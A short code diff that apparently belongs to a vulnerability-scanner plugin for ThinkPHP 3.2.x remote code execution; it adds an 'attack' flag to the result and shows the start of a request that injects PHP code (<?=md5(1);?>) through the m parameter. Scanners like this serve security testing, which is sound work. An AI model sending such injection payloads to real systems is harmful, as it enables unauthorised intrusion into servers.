@@ -7,7 +7,8 @@ from datetime import date, timedelta
 def verify(url):
     relsult = {
         'name': 'ThinkPHP3.2.x 远程代码执行',
-        'vulnerable': False
+        'vulnerable': False,
+        'attack': True,
     }
     payload1 = b'''
 GET /index.php?m=--><?=md5(1);?> HTTP/1.1
